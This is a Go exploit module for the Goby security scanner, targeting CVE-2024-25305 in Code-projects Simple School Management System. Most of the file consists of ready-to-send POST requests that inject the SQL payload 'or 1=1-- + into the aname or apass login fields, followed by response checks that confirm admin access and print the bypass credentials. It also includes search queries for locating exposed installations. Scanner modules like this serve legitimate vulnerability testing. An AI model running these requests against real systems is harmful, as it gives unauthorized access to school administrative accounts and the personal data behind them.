package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Simple School Managment System /index.php Permission Bypass Vulnerability (CVE-2024-25305)",
    "Description": "<p>Code-projects Simple School Managment System is a PHP-based school management system used to manage the daily affairs of the school. The 'apass' parameter and 'aname' parameter in the '/index.php' page of the system have an authentication bypass vulnerability, which can be exploited by attackers to bypass authentication and access unauthorized functionalities.</p>",
    "Product": "Simple School Managment System",
    "Homepage": "https://code-projects.org/simple-school-management-in-php-with-source-code/",
    "DisclosureDate": "2024-02-09",
    "PostTime": "2024-12-26",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"School Management System\"&&body=\"Tutor Joe's\"",
    "GobyQuery": "body=\"School Management System\"&&body=\"Tutor Joe's\"",
    "Level": "1",
    "Impact": "<p>The 'apass' and 'aname' parameters in the '/index.php' page of Code-projects Simple School Managment System 1.0 version have an authentication bypass vulnerability. Unauthenticated attackers can use this vulnerability to bypass authentication and access unauthorized functionalities.</p>",
    "Recommendation": "<p>1. Stay updated with vendor information and upgrade to the latest version: <a href=\"https://code-projects.org/simple-school-management-in-php-with-source-code/\">https://code-projects.org/simple-school-management-in-php-with-source-code/</a></p><p>2. Deploy a Web Application Firewall (WAF) to monitor database operations in real-time.</p><p>3. Restrict public access to the system or limit access permissions to reduce the attack surface.</p>",
    "References": [
        "https://github.com/tubakvgc/CVEs/tree/main/Simple%20School%20Management%20System"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "1'or 1=1-- +",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=1'or 1=1-- +&apass=1&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Invalid Username or Password",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.open('admin_home.php'",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=1&apass='or 1=1-- +&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.open('admin_home.php'",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Invalid Username or Password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname={{{exp_payload}}}&apass=1&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Invalid Username or Password",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.open('admin_home.php'",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|Log in using the following account and password account: 'or 1=1-- + password: 1"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=1&apass={{{exp_payload}}}&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.open('admin_home.php'",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Invalid Username or Password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|Log in using the following account and password account: 1 password: 'or 1=1-- +"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass",
        "2H1W"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-25305"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Simple School Managment System /index.php 权限绕过漏洞 （CVE-2024-25305）",
            "Product": "Simple School Managment System",
            "Description": "<p>Code-projects Simple School Managment System 是一个基于 PHP 的学校管理系统，用于管理学校的日常事务。该系统的 '/index.php' 页面中的 'apass' 参数和 'aname' 参数存在身份验证绕过漏洞，攻击者可以利用该漏洞绕过身份验证，并访问未经授权的功能。</p>",
            "Recommendation": "<p>1. 建议及时关注厂商信息并更新到最新版本：<a href=\"https://code-projects.org/simple-school-management-in-php-with-source-code/\">https://code-projects.org/simple-school-management-in-php-with-source-code/</a>。</p><p>2. 部署 Web 应用防火墙（WAF），对数据库操作进行实时监控。</p><p>3. 禁止公网访问该系统，或限制访问权限以减少攻击面。</p>",
            "Impact": "<p>Code-projects Simple School Managment System 1.0版本的 '/index.php' 页面中的 'apass' 参数和 'aname' 参数存在身份验证绕过漏洞，攻击者可以利用该漏洞绕过身份验证，并访问未经授权的功能。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Simple School Managment System /index.php Permission Bypass Vulnerability (CVE-2024-25305)",
            "Product": "Simple School Managment System",
            "Description": "<p>Code-projects Simple School Managment System is a PHP-based school management system used to manage the daily affairs of the school. The 'apass' parameter and 'aname' parameter in the '/index.php' page of the system have an authentication bypass vulnerability, which can be exploited by attackers to bypass authentication and access unauthorized functionalities.</p>",
            "Recommendation": "<p>1. Stay updated with vendor information and upgrade to the latest version: <a href=\"https://code-projects.org/simple-school-management-in-php-with-source-code/\">https://code-projects.org/simple-school-management-in-php-with-source-code/</a></p><p>2. Deploy a Web Application Firewall (WAF) to monitor database operations in real-time.</p><p>3. Restrict public access to the system or limit access permissions to reduce the attack surface.</p>",
            "Impact": "<p>The 'apass' and 'aname' parameters in the '/index.php' page of Code-projects Simple School Managment System 1.0 version have an authentication bypass vulnerability. Unauthenticated attackers can use this vulnerability to bypass authentication and access unauthorized functionalities.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "exp_payload": "define|variable|'or 1=1-- +"
    },
    "VariablesOrder": [
        "exp_payload"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }